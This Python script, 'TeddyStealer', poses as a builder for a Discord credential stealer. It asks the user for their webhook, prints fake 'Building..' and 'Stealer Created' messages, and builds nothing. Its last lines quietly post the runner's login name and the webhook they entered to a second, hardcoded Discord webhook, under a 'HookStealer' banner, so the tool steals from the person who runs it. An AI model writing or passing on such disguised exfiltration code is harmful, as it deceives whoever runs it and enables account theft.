import os
import time
import discord
import requests
from colorama import Fore, init

init(autoreset=True)
green = Fore.LIGHTGREEN_EX
dgreen = Fore.GREEN
white = Fore.RESET
red = Fore.LIGHTRED_EX
yellow = Fore.YELLOW
blue = Fore.LIGHTMAGENTA_EX
dblue = Fore.MAGENTA
gray = Fore.LIGHTBLACK_EX
intents = discord.Intents.all()

pcname = (os.getenv('COMPUTERNAME'))

os.system('title TeddyStealer')

def endHandler():
  os._exit(0)

def checkhook(hook):
    if not "api/webhooks" in hook:
        print(f"\n{Fore.RED}Invalid Webhook.{Fore.RESET}")
        time.sleep(1)
        endHandler()


print('''
 _________________________________________________________
|\=========================================================\
||                                                         |
||        _        __        ___        __        _        |
||       ; `-.__.-'. `-.__.-'. .`-.__.-' .`-.__.-' :       |
||     _.'. . . . . . . . .,,,,,,,. . . . . . . . .`._     |
||   .'. . . . . . . . ,a@@@@@@@@@@@a, . . . . . . . .`.   |
||   `. . . . ,a@@@@@a@@@a@@@@@@@@@a@@@a@@@@@a, . . . ,'   |
||     ) . . a@@@@@@a@@@@@a@@@@@@@a@@@@@a@@@@@@a . . (     |
||   ,' . . .@@@%%%a@@@@@@@@@@@@@@@@@@@@@a%%%@@@  . . `.   |
||   `.. . . @@@%%a@@@@@@""@@@@@@@""@@@@@@a%%@@@ . . .,'   |
||     ). . . "@@a@@@@@@@@@SSSSSSS@@@@@@@@@a@@" . . .(     |
||   ,'. . . . . `@@@@@@@@SSS, ,SSS@@@@@@@@' . . . . .`.   |
||   `. . . . . . `@@@@@@@`SSS:SSS'@@@@@@@' . . . . . ,'   |
||     ) . . . . . `@@@@@@@sssssss@@@@@@@' . . . . . (     |
||   ,' . . . . . ,a@@a@@@@@@@@@@@@@@@a@@a, . . . . . `.   |
||   `.. . . . .a@@@a@@@@@a@@@a@@@a@@@@@a@@@a. . . . .,'   |
||     ). . . .a@@@@@a@@@@@@@@@@@@@@@@@a@@@@@a. . . .(     |
||   ,'. . . . @@@@@@a@@@@'   "   `@@@@a@@@@@@ . . . .`.   |
||   `. . . . .@@@@@@@aaaa,       ,aaaa@@@@@@@  . . . ,'   |
||     ) . . . `@@@@@@@@@@@@a, ,a@@@@@@@@@@@@' . . . (     |
||   ,' . . . . .`@@@@@@@@@@a@a@a@@@@@@@@@@'. . . . . `.   |
||   `;;;;;;;;;;;;aaaaaaaaaa@@@@@aaaaaaaaaa;;;;;;;;;;;;'   |
||     );;;;;;;,mMMMMMMMm@@@@@@@@@@@mMMMMMMMm,;;;;;;;(     |
||   ,;;;;;;;;a@%#%%#%%#%Mm@@@@@@@mM%#%%#%%#%@a;;;;;;;;,   |
||   `;;;;;;;;@@%%%%%%%%%%M@@";"@@M%%%%%%%%%%@@;;;;;;;;'   |
||     );;;;;;`@a%%%%%%%%mM";;;;;"Mm%%%%%%%%a@';;;;;;(     |
||   ,;;;;;;;;;;"@@@@@@@@";;;;;;;;;"@@@@@@@@";;;;;;;;;;,   |
||   `;;;;;;;;;;;;"""""";;;;;;;;;;;;;"""""";;;;;;;;;;;;'   |
||     );;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;-Catalyst(     |
||     `:;;;:-~~~-:;;:-~~~-:;;;;;:-~~~-:;;:,-~~~-:;;;:'    |
||       ~~~       ~~        ~~~        ~~        ~~~      |
||                     .==============.                     |
||                     | TeddyStealer :                      |
||                     `--------------'                     |
\|_________________________________________________________|
''')
print(f"{blue}Hello " + pcname)

webhook = input(f"{dblue}Please Input Your Webhook: ")
checkhook(webhook)
time.sleep(2)
print('Building..')
time.sleep(1)
print(f"{dgreen}Stealer Created")
time.sleep(1)

webhookk = ('') #replace with your webhook

embed = {
            "avatar_url":"https://cdn.discordapp.com/attachments/939421597691961345/956607248195543121/IMG_3437.png?size=4096",
            "embeds": [
                {
                    "author": {
                        "name": "HookStealer",
                        "url": "https://github.com/Shade3421/HookStealer",
                        "icon_url": "https://cdn.discordapp.com/attachments/899433720791060520/956724321408127036/OIP.jpg?size=4096"
                    },
                    "description": f"{os.getlogin()} Has Executed HookStealer \n\n**Webhook** {webhook}",
                    "color": 0,

                    "thumbnail": {
                      "url": "https://cdn.discordapp.com/attachments/899433720791060520/956724321408127036/OIP.jpg?size=4096"
                    },       

                    "footer": {
                      "text": "Shade#3421 https://github.com/Shade3421/HookStealer"
                    }
                }
            ]
        }
requests.post(webhookk, json=embed)